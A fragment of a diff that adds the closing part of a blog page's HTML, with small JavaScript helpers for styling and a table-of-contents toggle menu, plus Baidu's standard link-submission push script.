+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
